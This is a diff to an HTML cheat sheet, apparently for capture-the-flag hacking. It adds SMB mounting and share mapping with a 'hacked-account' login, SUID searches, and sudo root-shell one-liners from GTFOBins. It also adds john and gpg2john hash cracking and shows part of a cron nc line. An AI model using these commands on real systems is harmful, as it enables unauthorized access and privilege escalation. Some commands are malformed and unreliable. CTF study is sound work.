@@ -34,6 +34,15 @@ and your IP changes just before the game starts, and no script have the correct 
 
 <b>Upload :</b> put
 
+<h2>Mount smb share</h2>
+
+<code>smbmount "\\\\10.10.10.10\\super-secret-folder" -U hacked-account -c 'mount /mnt/super-secret-folder/ -u 500 -g 100'</code>
+
+<h2>Map out smb shares</h2>
+
+smbmap -H 10.10.10.10
+smbmap -u hacked-account -p supersecretpassword123 -d workgroup -H 10.10.10.10
+
 
 
 <h2>FTP</h2>
@@ -166,12 +175,18 @@ LinEnum <li>https://github.com/rebootuser/LinEnum</li>
 
 <b>pform@attacker~: </b><code>find / -perm -u=s -type f 2>/dev/null</code>
 
+<b>pform@attacker~: </b><code>find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null</code>
 
 
 GTFObins <li>https://gtfobins.github.io/</li>
 
 
 <h2>GTFObins</h2>
+
+bash
+<code>sudo -u#-1 /bin/bash</code>
+
+<code>sudo bash -p</code>
 
 vim 
 <code>sudo vim</code> followed by <code>:!bash -p</code> ( -p flag make the progrom persist the root permision)
@@ -184,6 +199,7 @@ iftop
 
 find
 <code>sudo find . -exec /bin/sh \; -quit</code>
+
 
 nano
 <code>sudo nano</code> The Press <b>"CTRL+R CTRL+X"</b><code>reset sh 1>&0 2>&0</code> Can edit the sudoers file
@@ -229,8 +245,6 @@ add to crontab to get root after 1 min <code>echo ' *  *  *  *  * /usr/bin/nc -c
 <b>From sh to bash</b<code>python -c 'import pty;pty.spawn("/bin/bash")'</code>
 
 
-<h1>Stabalize your shell<h1>
-
 
 <h1>Password Cracking</h1>
 
@@ -245,4 +259,16 @@ add to crontab to get root after 1 min <code>echo ' *  *  *  *  * /usr/bin/nc -c
 <code>john --format=PKZIP ziphash.txt</code>
 
 <code>john --wordlist /opt/wordlists/rockyou.txt hash.txt</code>
+
+<b>PGP-Key</b>
+
+Extract crackable hash
+
+<code>/usr/sbin/gpg2john wordlist > wordlisthash-from-file</code>
+
+Crack Hash
+
+john -- wordlist=superlist.lst --format=gpg wordlisthash-from-file
+
+
 
